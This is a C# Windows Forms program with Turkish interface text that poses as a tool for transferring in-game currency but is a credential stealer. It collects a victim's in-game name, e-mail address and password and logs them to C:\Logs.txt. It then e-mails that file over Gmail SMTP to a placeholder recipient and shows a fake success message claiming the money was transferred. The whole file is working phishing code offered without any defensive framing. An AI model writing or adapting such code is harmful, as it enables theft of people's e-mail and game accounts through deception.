﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
namespace Project_Z
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        
        void Mail()
        {
          

        }
        private void button1_Click(object sender, EventArgs e)
        {
            string fileName = @"C:\Logs.txt";

            string writeText = "\n"+"Oyundaki isim: "+ textBox3.Text + "\n" + "E-Posta: "+ textBox1.Text +"\n Şifre: "+textBox2.Text + "\n";


            FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
            fs.Close();
            File.AppendAllText(fileName, Environment.NewLine + writeText);

            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("youremail@gmail.com");
            mail.To.Add("tosend@gmail.com");
            mail.Subject = "LOGLAR";
            mail.Body = "mail with attachment";

            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment("c:/Logs.txt");
            mail.Attachments.Add(attachment);

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("youremail@gmail.com", "app-password");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            progressBar1.Minimum = 0;
            progressBar1.Maximum = 100;
            progressBar1.Value = 100;
            MessageBox.Show("Oyundaki Paralarınız Aktarıldı! Aktarılmazsa(%2 şans) E posta-Şifre ve Oyundaki İsminizi Kontrol Edin!");
            
            

        }
    }
}
